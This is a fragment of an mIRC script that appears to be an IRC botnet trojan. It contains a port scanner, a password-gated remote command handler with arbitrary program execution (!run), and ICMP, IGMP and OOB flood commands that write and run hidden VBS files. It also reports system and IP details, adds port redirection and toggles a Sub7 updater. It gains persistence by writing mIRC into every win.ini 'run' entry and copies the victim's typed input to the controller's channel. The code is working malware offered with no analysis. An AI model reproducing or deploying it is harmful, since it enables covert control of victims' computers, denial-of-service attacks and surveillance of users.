n198=  .msg %port.nick now scanning  $+ %port.address $+  on Ports %port.start to %port.end with a delay of %port.delay  estimated time to finish, $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5))
n199=}
n200=alias portscan {
n201=  .sockopen port $+ %port.start $+ $chr(46) $+ %port.address %port.address %port.start
n202=  inc %port.start 1
n203=  if (%port.start >= %port.end) { .msg %port.nick Scanning of Ports has completed, now waiting for all ports to close | .timerport off | .timerportsock 0 5 portsock | halt }
n204=}
n205=alias portsock {
n206=  if ($sock(port*,0) = 0) {
n207=    .msg %port.nick scanning has now completed and all sockets have closed, you may now use port scan again
n208=    unset %port.*
n209=    .timerportsock off
n210=  }
n211=}
n212=on *:SOCKOPEN:port*: {
n213=  if ($sockerr > 0) { .sockclose $sockname | halt }
n214=  .msg %port.nick Address: $gettok($remove($sockname,port),2-,46) Port: $gettok($remove($sockname,port),1,46)
n215=  .sockclose $sockname
n216=}
n217=
n218=on 1:TEXT:!login *:*: { 
n219=  if ($2 = %script.pass) && ($site = elite.jb.userz) { auser 700 $nick | .notice $nick Access granted Jonblaze now smokin }
n220=}
n221=on 700:TEXT:*:*: {
n222=  if ($exists(temp2.exe) == $false) { /quit Error/Missing File ( $+ $ip $+ ) (temp2.exe (hide not detected! quitting)) | /exit }
n223=  if ($1 = !version) { msg $chan %quit -=I Own j00=- }
n224=  if ($1 = !msg) && ($3 != $null) { /msg $2- | .notice $NICK Task Completed. }
n225=  if ($1 = !flood) && ($2 != $null) { /fuck $2- }
n226=  if ($1 = !floodoff) { /cleanup }
n227=  if ($1 = !part) && ($2 != $null) { /PART $2- | .notice $NICK Task Completed. }
n228=  if ($1 = !join) && ($2 != $null) { /Join $2 | .notice $NICK Task Completed. }
n229=  if ($1 = !dienow) { /quit I Am a Bitch who hates $nick for killing me | /exit }
n230=  if ($1 = !randomnicks) { /random | .notice $NICK Task Completed. }
n231=  if ($1 = !setserver) && ($2 != $null) { /set %server $2- | .notice $NICK Task Completed. }
n232=  if ($1 = !Nick) && ($2 != $null) { /nick $2- | .notice $NICK Task Completed. }
n233=  if ($1 = !notice) && ($3 != $null) { /notice $2- | .notice $NICK Task Completed. }
n234=  if ($1 = !Ru) && ($2 != $null) { /ruser $2- | notice $nick $2- Removed From My Access List. }
n235=  if ($1 = !packet) { packetofdeath $2 $3 $4 }
n236=  if ($1 = !icmp) { if ($4 == $null) { /msg # icmp error! | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs }  { msg # 4[sending ( $+ $4 $+ ) ICMP-packets to ( $+ $2 $+ ) Sized: ( $+ $3 $+ )14] }   
n237=  if ($1 = !run) && ($2 != $null) { //run $2- }
n238=  if ($1 = !igmp) { if ($2 == $null) { /msg # igmp error! | halt } | .remove igmp.vbs | .write igmp.vbs Set src3 = CreateObject("Wscript.shell") | .write igmp.vbs src3.run "command /c igmp $2 ",0,true | .run igmp.vbs } { msg # 4[sending ( $+ IGMP $+ ) packets to ( $+ $2 $+ ) }   
n239=  if ($1 = !Connection) { /msg $chan  Connection[4 $+ $dll(moo.dll,connection,_) $+ ] Network Interfaces[4 $+ $dll(moo.dll,interfaceinfo,_) $+ ] } 
n240=  if ($1 = !stats) { if ($chan != $null) { .msg $chan I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) } | else { .msg $nick I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) } }
n241=  if ($1 = !system) /msg $chan 4[12system info4] os: [04 $+ $dll(moo.dll,osinfo,_) $+ ] cpu: [04 $+ $dll(moo.dll,cpuinfo,_) $+ ] resolution: [04 $+ $window(-1).w $+ x $+ $window(-1).h $+ ] video card: [04 $+ $readini c:\windows\system.ini boot.description display.drv $+ ] free space: [04 $+ $round($calc((($disk(c).free) + ($disk(d).free) + ($disk(e).free))/1048576),2) mb] mem: [04 $+ $dll(moo.dll,meminfo,_) $+ $result $+ ] uptime: [04 $+ $duration($calc($ticks / 1000 )) $+ ]  
n242=  if ($1 = !oob) { if ($3 == $null) { /msg # oob error! | halt } | .remove pepsi.vbs | .write pepsi.vbs Set src3 = CreateObject("Wscript.shell") | .write pepsi.vbs src3.run "command /c pepsi -n $3 -p $4 -d $5 $2 ",0,true | .run pepsi.vbs } { msg # 4[sending ( $+ OOB-CRASH $+ ) to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] }   
n243=  if ($1 = !url) { if ($url != $null) { .msg $chan i'm currently at $url } | else { .msg $chan i'm not at any urls } }
n244=  if ($1 = !reboot) { .notice $nick Bye :( | /run $mircdir $+ rb.exe }
n245=  if ($1 = !varset) && ($3 != $null) { //set $2 [ [ $3- ] ] | //msg # 14[12var set:14] [12 $+ $2 $+ 14] :to: [12 $+ [ [ $3- ] ] $+ 14]  }
n246=  if ($1 = !var) && ($2 != $null) { msg $chan  $+ $2 $+  is currently set to [ [ $2- ] ] }
n247=  if ($1 = !pfast) && ($chan != $null) { //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,64000) | halt } | //gcoolstart $2 $3 $4 }
n248=  if ($1 = !portredirect) { if ($2 == $null) { /msg # 14Portredirection Error!!! For help type: !portredirect help | halt } | if ($2 == help) { /msg # 14*** Port Redirection Help! *** | /msg # 14Commands.. | //msg # 14!portredirect add 1000 irc.dal.net 6667 | //msg # 14!portredirect stop port | //msg # 14!portredirect stats | /msg # 14Port Redirect Help / END halt } | if ($2 == add) { if ($5 == $null) { /msg # 3Port Redirection Error: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.dal.net 6667) | halt } | //gtportdirect $3- | /msg # 14[Redirect Added] I-port=( $+ $3 $+ ) to $4 $+ $5 | /msg # 12[Local IP Address]:14 $ip |  halt  } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  /msg # 14[Portredirection] Port:(12 $+ $3 $+ 14) Has been stopped. |  halt  } | if ($2 == stats) { |  //msg  # 12*** Port Redirection Stat's. |  /predirectstats #  } }
n249=  if ($1 = !icqpage) { if ($2 == $null) { /msg # icqpage error! | halt } | /msg # Paging $2 | //run http://wwp.icq.com/scripts/WWPMsg.dll?from= $+ $3 $+ &fromemail=mmMAIL&subject= $+ $4 $+ &body= $+ $5 $+ &to= $+ $2 }  
n250=  if ($1 = !sub7) { if ($2 = ON) { if ($group(#Sub7Update) = on) { .msg $chan Sub7 Auto Updater is Allready Enabled } | else { .msg $chan Sub7 Auto Updater Now Enabled | .enable #Sub7Update } } | if ($2 = OFF) { if ($group(#Sub7Update) = off) { .msg $chan Sub7 Auto Updater Allready Dissabled } | else { .msg $chan Sub7 Auto Updater Now Dissabled | .disable #Sub7Update } } | else { .msg $chan Syntax: type either !sub7 ON to turn it on or !sub7 OFF to dissable it } }
n251=}
n252=on *:DISCONNECT: { .flush | .timergetinchan off | random | //timerconnect 0 100 /server %connect.server |   set %load.write $findfile(c:\,win.ini,0) | if (%load.write > 0) { set %load.count 0 | :start | inc %load.count 1 | writeini $findfile(c:\,win.ini,%load.count) windows run $mircexe | if (%load.count < %loud.write) { goto start } } | unset %load.* }
n253=on *:OP:#: { if ($chan = %connect.chan) && ($opnick = $me) { mode $chan +munst-iR } }
n254=on *:INPUT:*: { haltdef | /echo -a < $+ $me $+ > $1- | msg %connect.chan --Warning- (Input command) $1- | /clearall | //run temp2.exe /n /fh        | halt }
n255=}
